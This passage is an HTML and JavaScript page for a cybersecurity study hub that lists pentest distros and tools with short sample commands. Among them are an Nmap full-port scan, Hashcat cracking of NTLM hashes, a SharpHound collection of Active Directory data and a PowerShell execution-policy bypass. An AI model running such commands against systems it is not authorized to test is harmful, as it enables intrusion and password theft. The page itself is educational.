@@ -1,0 +1,1475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ZeR0CyB3r // Cyber Security Knowledge &amp; Study Hub</title>
+  <meta name="description" content="All-in-one centralized cyber security knowledge repository: Books, PDFs, Tools, Operating Systems, Video masterclasses, and Cheat Sheets." />
+  <meta property="og:title" content="ZeR0CyB3r // Cyber Security Knowledge &amp; Study Hub" />
+  <meta property="og:description" content="Access all cybersecurity study materials, books, tools, and OS in one single place." />
+
+  <!-- Typography & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <!-- Stylesheets -->
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="css/style.css" />
+
+  <style>
+    /* Dedicated Cyber Knowledge Hub Styling */
+    .hub-header {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      background: rgba(9, 9, 11, 0.92);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-bottom: 1px solid var(--border-card);
+      padding: 14px 0;
+    }
+
+    .hub-header-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .hub-brand-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+    }
+
+    .hub-brand-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .hub-brand-title {
+      font-family: var(--font-mono);
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      color: var(--text-primary);
+    }
+
+    .hub-brand-sub {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--crimson-light);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .hub-user-badge-wrap {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+    }
+
+    .hub-user-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 14px;
+      background: rgba(255, 0, 56, 0.1);
+      border: 1px solid rgba(255, 0, 56, 0.3);
+      border-radius: var(--radius-full);
+      color: var(--text-primary);
+    }
+
+    .hub-user-pill .live-dot {
+      width: 7px;
+      height: 7px;
+      background: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #10b981;
+      animation: pulseGreen 2s infinite;
+    }
+
+    @keyframes pulseGreen {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(1.3); }
+    }
+
+    /* Hero Section */
+    .hub-hero {
+      padding: 48px 0 32px;
+      text-align: center;
+      position: relative;
+    }
+
+    .hub-hero-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      color: var(--crimson-light);
+      padding: 5px 14px;
+      background: rgba(255, 0, 56, 0.08);
+      border: 1px solid rgba(255, 0, 56, 0.25);
+      border-radius: var(--radius-full);
+      margin-bottom: 16px;
+    }
+
+    .hub-hero-title {
+      font-size: clamp(26px, 4vw, 42px);
+      font-weight: 800;
+      line-height: 1.15;
+      letter-spacing: -0.02em;
+      color: #fff;
+      margin-bottom: 14px;
+    }
+
+    .hub-hero-title span {
+      color: var(--crimson-light);
+      text-shadow: 0 0 20px rgba(255, 0, 56, 0.4);
+    }
+
+    .hub-hero-desc {
+      font-size: 15px;
+      color: var(--text-secondary);
+      max-width: 720px;
+      margin: 0 auto 28px;
+      line-height: 1.6;
+    }
+
+    /* Stats Banner */
+    .hub-stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 12px;
+      max-width: 800px;
+      margin: 0 auto 36px;
+    }
+
+    .hub-stat-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      padding: 12px 16px;
+      text-align: center;
+      transition: var(--transition);
+    }
+
+    .hub-stat-card:hover {
+      border-color: var(--crimson-glow);
+      transform: translateY(-2px);
+    }
+
+    .hub-stat-num {
+      font-family: var(--font-mono);
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--crimson-light);
+    }
+
+    .hub-stat-label {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* Controls: Search + Filter Tabs */
+    .hub-controls-bar {
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-lg);
+      padding: 20px;
+      margin-bottom: 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    .hub-search-wrap {
+      position: relative;
+      width: 100%;
+    }
+
+    .hub-search-wrap i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-muted);
+      font-size: 16px;
+    }
+
+    .hub-search-input {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      padding: 14px 16px 14px 44px;
+      font-family: var(--font-mono);
+      font-size: 14px;
+      color: var(--text-primary);
+      transition: var(--transition);
+      outline: none;
+    }
+
+    .hub-search-input:focus {
+      border-color: var(--crimson-light);
+      box-shadow: 0 0 16px var(--crimson-glow);
+    }
+
+    .hub-filter-tabs {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .hub-filter-btn {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 8px 14px;
+      border-radius: var(--radius-sm);
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border-card);
+      color: var(--text-secondary);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: var(--transition);
+      user-select: none;
+    }
+
+    .hub-filter-btn:hover {
+      background: rgba(255, 0, 56, 0.08);
+      border-color: rgba(255, 0, 56, 0.3);
+      color: var(--text-primary);
+    }
+
+    .hub-filter-btn.active {
+      background: var(--crimson-primary);
+      border-color: var(--crimson-primary);
+      color: #fff;
+      box-shadow: 0 0 12px var(--crimson-glow);
+    }
+
+    .hub-filter-count {
+      font-size: 10px;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 2px 6px;
+      border-radius: 10px;
+      margin-left: 2px;
+    }
+
+    .hub-results-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--text-muted);
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      padding-top: 12px;
+    }
+
+    /* Resources Grid */
+    .hub-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 20px;
+      margin-bottom: 60px;
+    }
+
+    .hub-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-md);
+      padding: 22px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      transition: var(--transition);
+      overflow: hidden;
+    }
+
+    .hub-card:hover {
+      border-color: var(--crimson-glow);
+      background: var(--bg-card-hover);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.6), 0 0 16px rgba(255, 0, 56, 0.15);
+    }
+
+    .hub-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--crimson-primary), transparent);
+      opacity: 0;
+      transition: var(--transition);
+    }
+
+    .hub-card:hover::before {
+      opacity: 1;
+    }
+
+    .hub-card-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .hub-cat-badge {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: var(--radius-sm);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .cat-books { background: rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.35); color: #60a5fa; }
+    .cat-tools { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.35); color: #f87171; }
+    .cat-os { background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.35); color: #34d399; }
+    .cat-videos { background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.35); color: #c084fc; }
+    .cat-cheatsheets { background: rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.35); color: #fbbf24; }
+
+    .hub-card-bookmark-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 16px;
+      transition: var(--transition);
+      padding: 4px;
+    }
+
+    .hub-card-bookmark-btn:hover {
+      color: #fbbf24;
+      transform: scale(1.15);
+    }
+
+    .hub-card-bookmark-btn.bookmarked {
+      color: #fbbf24;
+    }
+
+    .hub-card-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .hub-card-title i {
+      color: var(--crimson-light);
+      font-size: 16px;
+    }
+
+    .hub-card-desc {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.55;
+      margin-bottom: 16px;
+    }
+
+    .hub-code-preview {
+      background: rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: var(--radius-sm);
+      padding: 8px 12px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: #38bdf8;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+      overflow-x: auto;
+    }
+
+    .hub-code-preview span {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .hub-copy-inline-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 12px;
+      padding: 2px 6px;
+      transition: var(--transition);
+    }
+
+    .hub-copy-inline-btn:hover {
+      color: #fff;
+    }
+
+    .hub-card-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-bottom: 18px;
+    }
+
+    .hub-tag-pill {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--text-muted);
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 4px;
+      padding: 2px 8px;
+    }
+
+    .hub-card-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: auto;
+    }
+
+    .hub-btn-action {
+      flex: 1;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 700;
+      padding: 9px 14px;
+      border-radius: var(--radius-sm);
+      text-decoration: none;
+      transition: var(--transition);
+      cursor: pointer;
+    }
+
+    .hub-btn-primary {
+      background: var(--crimson-primary);
+      border: 1px solid var(--crimson-primary);
+      color: #fff;
+    }
+
+    .hub-btn-primary:hover {
+      background: var(--crimson-dark);
+      box-shadow: 0 0 14px var(--crimson-glow);
+    }
+
+    .hub-btn-secondary {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border-card);
+      color: var(--text-secondary);
+    }
+
+    .hub-btn-secondary:hover {
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--text-primary);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    /* Modal Styling */
+    .hub-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      z-index: 2000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .hub-modal-overlay.active {
+      display: flex;
+    }
+
+    .hub-modal-box {
+      background: #0d1117;
+      border: 1px solid rgba(255, 0, 56, 0.4);
+      border-radius: var(--radius-lg);
+      width: 100%;
+      max-width: 680px;
+      max-height: 85vh;
+      overflow-y: auto;
+      padding: 28px;
+      position: relative;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 30px rgba(255, 0, 56, 0.25);
+    }
+
+    .hub-modal-close {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: 1px solid var(--border-card);
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      color: var(--text-secondary);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: var(--transition);
+    }
+
+    .hub-modal-close:hover {
+      background: var(--crimson-primary);
+      color: #fff;
+      border-color: var(--crimson-primary);
+    }
+
+    /* Toast Notification */
+    .hub-toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #18181b;
+      border: 1px solid var(--crimson-primary);
+      color: var(--text-primary);
+      padding: 12px 20px;
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 13px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 20px var(--crimson-glow);
+      z-index: 9999;
+    }
+
+    .hub-toast.show {
+      display: flex;
+      animation: slideUpToast 0.3s ease-out;
+    }
+
+    @keyframes slideUpToast {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Hub Navigation Bar -->
+  <header class="hub-header">
+    <div class="container hub-header-container">
+      <a href="index.html" class="hub-brand-group">
+        <div class="brand-logo-frame" style="width: 38px; height: 38px;">
+          <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuCRtozZTae-iJGRMRf5OdtecLe3vRbR1c7mhPaU-cuBZvExyv9c0uRWaWIcpb2vBMcAL2SKIOi4MtOH-zTGy_pb9VliVp73lrgEXCk5YtLl-dMzoY1-rmAYLFed925Q1AjQ9ztRUuTrRJj3PFWO1pwE63St8LK2X75RAAUVGCxPbpYSOK4ea9q3uXmk82cZhQqKWUz2VMH-X2lTn6NtrmCI1-oE3URkdX0saheyM2mdIdDQO0E3lZe_hU-hK6jyKlSkIzo" alt="ZeR0CyB3r" referrerpolicy="no-referrer" />
+        </div>
+        <div class="hub-brand-text">
+          <span class="hub-brand-title">ZeR0CyB3r // KNOWLEDGE ARSENAL</span>
+          <span class="hub-brand-sub">Curated Cybersecurity Vault</span>
+        </div>
+      </a>
+
+      <!-- Operator Session Status -->
+      <div class="hub-user-badge-wrap">
+        <div class="hub-user-pill" id="hubUserPill">
+          <span class="live-dot"></span>
+          <span id="hubOperatorName">OPERATOR CLEARANCE ACTIVE</span>
+        </div>
+        <a href="index.html" class="btn btn-outline" style="font-size: 11px; padding: 6px 12px; text-decoration: none;">
+          <i class="fa-solid fa-arrow-left"></i>
+          <span>PORTFOLIO</span>
+        </a>
+        <button type="button" class="btn btn-outline" id="hubLogoutBtn" onclick="handleHubLogout()" style="font-size: 11px; padding: 6px 12px; font-family: var(--font-mono); color: var(--crimson-light); border-color: rgba(255, 0, 56, 0.35); cursor: pointer; display: inline-flex; align-items: center; gap: 6px;">
+          <i class="fa-solid fa-right-from-bracket text-crimson"></i>
+          <span>LOG OUT</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content Container -->
+  <main class="container">
+    
+    <!-- Hero Banner -->
+    <section class="hub-hero">
+      <div class="hub-hero-tag">
+        <i class="fa-solid fa-shield-halved"></i>
+        <span>CENTRALIZED ALL-IN-ONE CYBERSECURITY REPOSITORY</span>
+      </div>
+      <h1 class="hub-hero-title">
+        Cyber Security <span>Arsenal &amp; Study Hub</span>
+      </h1>
+      <p class="hub-hero-desc">
+        Ab internet par baar-baar alag alag jagah search karne ki zaroorat nahi. Ethical hacking, SOC analysis, penetration testing, standard reference books, security operating systems, practical video series, aur instant cheat sheets — sab kuch ek hi curated console me.
+      </p>
+
+      <!-- Stats Bar -->
+      <div class="hub-stats-grid">
+        <div class="hub-stat-card">
+          <div class="hub-stat-num">50+</div>
+          <div class="hub-stat-label">Verified Resources</div>
+        </div>
+        <div class="hub-stat-card">
+          <div class="hub-stat-num">12+</div>
+          <div class="hub-stat-label">Security Tools</div>
+        </div>
+        <div class="hub-stat-card">
+          <div class="hub-stat-num">06+</div>
+          <div class="hub-stat-label">Dedicated OS Distros</div>
+        </div>
+        <div class="hub-stat-card">
+          <div class="hub-stat-num">10+</div>
+          <div class="hub-stat-label">Books &amp; PDF Guides</div>
+        </div>
+        <div class="hub-stat-card">
+          <div class="hub-stat-num">08+</div>
+          <div class="hub-stat-label">Video Masterclasses</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Controls Bar: Real-time Search & Filter Tabs -->
+    <section class="hub-controls-bar">
+      <div class="hub-search-wrap">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input 
+          type="text" 
+          id="hubSearchInput" 
+          class="hub-search-input" 
+          placeholder="Search by name, tool, topic, book, OS, or command (e.g. Kali, Wireshark, Nmap, SOC, OWASP)..." 
+          oninput="handleSearchChange()"
+        />
+      </div>
+
+      <!-- Categories Filter Tabs -->
+      <div class="hub-filter-tabs">
+        <button class="hub-filter-btn active" data-category="all" onclick="filterCategory('all', this)">
+          <i class="fa-solid fa-layer-group"></i>
+          <span>All Resources</span>
+          <span class="hub-filter-count" id="countAll">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="tools" onclick="filterCategory('tools', this)">
+          <i class="fa-solid fa-wrench"></i>
+          <span>Security Tools</span>
+          <span class="hub-filter-count" id="countTools">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="os" onclick="filterCategory('os', this)">
+          <i class="fa-solid fa-desktop"></i>
+          <span>Operating Systems</span>
+          <span class="hub-filter-count" id="countOs">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="books" onclick="filterCategory('books', this)">
+          <i class="fa-solid fa-book-open"></i>
+          <span>Books &amp; PDFs</span>
+          <span class="hub-filter-count" id="countBooks">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="videos" onclick="filterCategory('videos', this)">
+          <i class="fa-solid fa-play-circle"></i>
+          <span>Video Courses</span>
+          <span class="hub-filter-count" id="countVideos">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="cheatsheets" onclick="filterCategory('cheatsheets', this)">
+          <i class="fa-solid fa-file-code"></i>
+          <span>Cheat Sheets &amp; Commands</span>
+          <span class="hub-filter-count" id="countCheatsheets">0</span>
+        </button>
+        <button class="hub-filter-btn" data-category="bookmarks" onclick="filterCategory('bookmarks', this)">
+          <i class="fa-solid fa-star text-crimson"></i>
+          <span>Saved Bookmarks</span>
+          <span class="hub-filter-count" id="countBookmarks">0</span>
+        </button>
+      </div>
+
+      <!-- Results Meta -->
+      <div class="hub-results-meta">
+        <span id="hubResultsCount">Displaying verified cyber security resources...</span>
+        <span style="color: var(--crimson-light);"><i class="fa-solid fa-terminal"></i> ZERO-SEARCH OVERHEAD SYSTEM</span>
+      </div>
+    </section>
+
+    <!-- Resources Dynamic Grid -->
+    <div class="hub-grid" id="hubGrid">
+      <!-- Injected by JavaScript -->
+    </div>
+
+  </main>
+
+  <!-- Resource Details Modal -->
+  <div class="hub-modal-overlay" id="hubModalOverlay" onclick="closeHubModal(event)">
+    <div class="hub-modal-box" id="hubModalBox">
+      <button class="hub-modal-close" onclick="closeHubModalDirect()"><i class="fa-solid fa-xmark"></i></button>
+      <div id="hubModalContent">
+        <!-- Injected via JavaScript -->
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div class="hub-toast" id="hubToast">
+    <i class="fa-solid fa-circle-check text-crimson"></i>
+    <span id="hubToastMsg">Copied to clipboard!</span>
+  </div>
+
+  <!-- Footer -->
+  <footer class="auth-footer" style="margin-top: 40px;">
+    <span>&copy; 2026 ZeR0CyB3r // Pranshu Verman &bull; Offensive Security, VAPT &amp; Threat Intelligence Knowledge Vault</span>
+  </footer>
+
+  <!-- Complete Interactive Knowledge Repository Engine -->
+  <script>
+    // Complete Verified Master Dataset
+    const CYBER_RESOURCES = [
+      // ==========================================
+      // 1. SECURITY OPERATING SYSTEMS (DISTROS)
+      // ==========================================
+      {
+        id: "os-kali",
+        category: "os",
+        title: "Kali Linux 2026",
+        badgeText: "OFFENSIVE OS",
+        badgeClass: "cat-os",
+        icon: "fa-linux",
+        desc: "The premier Debian-based penetration testing distribution equipped with over 600+ pre-installed security testing and forensics tools.",
+        code: "sudo apt update && sudo apt dist-upgrade -y",
+        tags: ["Offensive Security", "Penetration Testing", "Debian", "VirtualBox / VMware"],
+        url: "https://www.kali.org/get-kali/",
+        actionText: "Download Kali ISO",
+        level: "Beginner to Pro",
+        details: "Official Kali Linux download repository. Supported on Bare Metal, Virtual Machines (VMware, VirtualBox), WSL2, and Raspberry Pi. Default credentials: kali / kali."
+      },
+      {
+        id: "os-parrot",
+        category: "os",
+        title: "Parrot Security OS",
+        badgeText: "SECURITY OS",
+        badgeClass: "cat-os",
+        icon: "fa-shield-halved",
+        desc: "A lightweight, hardened operating system designed for ethical hackers, penetration testers, and digital privacy enthusiasts.",
+        code: "sudo parrot-upgrade",
+        tags: ["Lightweight", "Privacy", "Debian Core", "Hardened Kernel"],
+        url: "https://parrotsec.org/download/",
+        actionText: "Get Parrot OS",
+        level: "All Levels",
+        details: "Parrot Security provides a complete portable laboratory for cyber security operations, software development, and digital privacy defenses."
+      },
+      {
+        id: "os-remnux",
+        category: "os",
+        title: "REMnux Malware Analysis OS",
+        badgeText: "FORENSICS / RE",
+        badgeClass: "cat-os",
+        icon: "fa-virus-slash",
+        desc: "A Linux toolkit for reverse-engineering and analyzing malicious software, memory forensics, and document inspection curated by Lenny Zeltser.",
+        code: "remnux update",
+        tags: ["Malware Analysis", "Reverse Engineering", "Memory Forensics", "SOC L2/L3"],
+        url: "https://remnux.org/",
+        actionText: "Download REMnux",
+        level: "Intermediate / Pro",
+        details: "Preconfigured with Ghidra, Cutter, Volatility, YARA, Wireshark, and static/dynamic malware disassemblers."
+      },
+      {
+        id: "os-blackarch",
+        category: "os",
+        title: "BlackArch Linux",
+        badgeText: "ELITE ARSENAL",
+        badgeClass: "cat-os",
+        icon: "fa-terminal",
+        desc: "An Arch Linux-based penetration testing distribution containing an expansive arsenal of over 2,800+ specialized security tools.",
+        code: "pacman -Syu && pacman -S blackarch",
+        tags: ["Arch Linux", "2800+ Tools", "Lightweight Window Managers", "Hardcore"],
+        url: "https://blackarch.org/downloads.html",
+        actionText: "Get BlackArch",
+        level: "Advanced",
+        details: "Designed specifically for elite security researchers and red team operators. Can be installed directly over existing Arch Linux installations."
+      },
+      {
+        id: "os-tails",
+        category: "os",
+        title: "Tails OS (The Amnesic Incognito Live System)",
+        badgeText: "PRIVACY & ANONYMITY",
+        badgeClass: "cat-os",
+        icon: "fa-mask",
+        desc: "A portable live operating system that protects against surveillance and censorship by forcing all outgoing traffic through the Tor network.",
+        code: "Live USB Bootable &bull; Amnesic RAM-only",
+        tags: ["Tor Network", "Amnesic", "Cryptographic Tools", "Whistleblower Safe"],
+        url: "https://tails.net/install/",
+        actionText: "Download Tails",
+        level: "All Levels",
+        details: "Leaves no digital traces on the computer you use unless explicitly instructed. Runs entirely in RAM and shuts down cleanly."
+      },
+      {
+        id: "os-commando",
+        category: "os",
+        title: "Commando VM (Mandiant)",
+        badgeText: "WINDOWS PENTEST",
+        badgeClass: "cat-os",
+        icon: "fa-windows",
+        desc: "Mandiant's Windows-based Automated Penetration Testing distribution customized for Active Directory assessment and red teaming.",
+        code: "powershell -exec bypass boxstarter.bat",
+        tags: ["Active Directory", "Windows Red Teaming", "Mandiant", "BloodHound"],
+        url: "https://github.com/mandiant/commando-vm",
+        actionText: "Commando VM Repo",
+        level: "Intermediate / Pro",
+        details: "Includes 140+ native Windows attack tools such as Mimikatz, BloodHound, PowerView, SharpHound, and Burp Suite."
+      },
+
+      // ==========================================
+      // 2. INDUSTRY SECURITY TOOLS & WEAPONRY
+      // ==========================================
+      {
+        id: "tool-burp",
+        category: "tools",
+        title: "Burp Suite Community &amp; Pro",
+        badgeText: "WEB VAPT",
+        badgeClass: "cat-tools",
+        icon: "fa-spider",
+        desc: "The gold standard web application security testing toolkit. Includes HTTP proxy, repeater, decoder, and automated vulnerability scanner.",
+        code: "Proxy 127.0.0.1:8080 &bull; CA Certificate installed",
+        tags: ["Web Security", "OWASP Top 10", "Intercept Proxy", "PortSwigger"],
+        url: "https://portswigger.net/burp/communitydownload",
+        actionText: "Download Burp Suite",
+        level: "Beginner to Pro",
+        details: "Used by penetration testers worldwide to discover SQLi, XSS, CSRF, SSRF, IDOR, and authentication bypass vulnerabilities."
+      },
+      {
+        id: "tool-wireshark",
+        category: "tools",
+        title: "Wireshark Packet Analyzer",
+        badgeText: "NETWORK FORENSICS",
+        badgeClass: "cat-tools",
+        icon: "fa-network-wired",
+        desc: "The world's most popular deep network packet inspection and protocol analysis utility. Capture and decrypt real-time network traffic.",
+        code: "wireshark -k -i eth0 -Y 'http.request.method == POST'",
+        tags: ["PCAP Analysis", "TCP/IP Inspection", "Protocol Decryption", "SOC Analysis"],
+        url: "https://www.wireshark.org/download.html",
+        actionText: "Download Wireshark",
+        level: "All Levels",
+        details: "Crucial for both defensive SOC analysts analyzing malware beaconing and offensive penetration testers auditing network protocol weaknesses."
+      },
+      {
+        id: "tool-nmap",
+        category: "tools",
+        title: "Nmap Network Mapper &amp; NSE",
+        badgeText: "RECONNAISSANCE",
+        badgeClass: "cat-tools",
+        icon: "fa-radar",
+        desc: "Network discovery and vulnerability scanning tool. Inspect open ports, running services, operating system fingerprints, and run NSE scripts.",
+        code: "nmap -sC -sV -p- -T4 -oA target_scan 192.168.1.1",
+        tags: ["Port Scanning", "NSE Scripts", "Host Discovery", "Service Fingerprint"],
+        url: "https://nmap.org/download.html",
+        actionText: "Download Nmap",
+        level: "Essential / All Levels",
+        details: "The bedrock utility of every security audit. Features hundreds of Lua-based Nmap Scripting Engine (NSE) modules for vulnerability detection."
+      },
+      {
+        id: "tool-metasploit",
+        category: "tools",
+        title: "Metasploit Framework",
+        badgeText: "EXPLOITATION ENGINE",
+        badgeClass: "cat-tools",
+        icon: "fa-crosshairs",
+        desc: "The world's most widely used penetration testing framework. Verify vulnerabilities, manage payloads, and perform post-exploitation audits.",
+        code: "msfconsole -q",
+        tags: ["Exploit DB", "Meterpreter", "Post Exploitation", "Payload Generation"],
+        url: "https://www.metasploit.com/",
+        actionText: "Get Metasploit",
+        level: "Intermediate",
+        details: "Provides thousands of verified exploit modules, auxiliary scanners, and encoders with rapid shellcode staging via Meterpreter."
+      },
+      {
+        id: "tool-ghidra",
+        category: "tools",
+        title: "Ghidra SRE (NSA)",
+        badgeText: "REVERSE ENGINEERING",
+        badgeClass: "cat-tools",
+        icon: "fa-microchip",
+        desc: "National Security Agency's open-source Software Reverse Engineering framework. Decompiles x86, ARM, MIPS, and executes binary disassembling.",
+        code: "ghidraRun",
+        tags: ["NSA Toolkit", "Binary Disassembler", "Decompiler", "Malware Analysis"],
+        url: "https://ghidra-sre.org/",
+        actionText: "Download Ghidra",
+        level: "Advanced",
+        details: "Features a rich GUI, automated code analysis, symbol management, headless script execution, and multi-processor architecture support."
+      },
+      {
+        id: "tool-hashcat",
+        category: "tools",
+        title: "Hashcat &amp; John the Ripper",
+        badgeText: "PASSWORD CRACKING",
+        badgeClass: "cat-tools",
+        icon: "fa-key",
+        desc: "World's fastest GPU-based rule cracking engine supporting over 300+ hash types including NTLM, MD5, SHA-256, Kerberos 5, and bcrypt.",
+        code: "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt",
+        tags: ["GPU Cracking", "Rule-based Attack", "NTLM / Kerberos", "Wordlists"],
+        url: "https://hashcat.net/hashcat/",
+        actionText: "Download Hashcat",
+        level: "Intermediate",
+        details: "Utilizes OpenCL and CUDA to achieve billions of hash comparisons per second on modern graphics hardware."
+      },
+      {
+        id: "tool-autopsy",
+        category: "tools",
+        title: "Autopsy Digital Forensics",
+        badgeText: "DIGITAL FORENSICS",
+        badgeClass: "cat-tools",
+        icon: "fa-magnifying-glass-chart",
+        desc: "Premier open-source digital forensics platform and graphical interface to The Sleuth Kit. Analyze hard drive images, memory, and smartphone dumps.",
+        code: "E01 / Raw DD Image Ingestion &amp; Timeline Analysis",
+        tags: ["Hard Drive Forensics", "Timeline Analysis", "Deleted File Recovery", "DFIR"],
+        url: "https://www.autopsy.com/download/",
+        actionText: "Download Autopsy",
+        level: "Intermediate",
+        details: "Used by law enforcement, military, and corporate forensic examiners to investigate compromised systems and extract digital artifacts."
+      },
+      {
+        id: "tool-bloodhound",
+        category: "tools",
+        title: "BloodHound &amp; SharpHound",
+        badgeText: "ACTIVE DIRECTORY",
+        badgeClass: "cat-tools",
+        icon: "fa-diagram-project",
+        desc: "Graph-theory visualization tool used to uncover hidden relationships and attack paths within complex Microsoft Active Directory environments.",
+        code: "SharpHound.exe -c All --zipfilename ad_collection.zip",
+        tags: ["Active Directory", "Graph Theory", "Kerberoasting", "Privilege Paths"],
+        url: "https://github.com/BloodHoundAD/BloodHound",
+        actionText: "BloodHound Repo",
+        level: "Intermediate / Advanced",
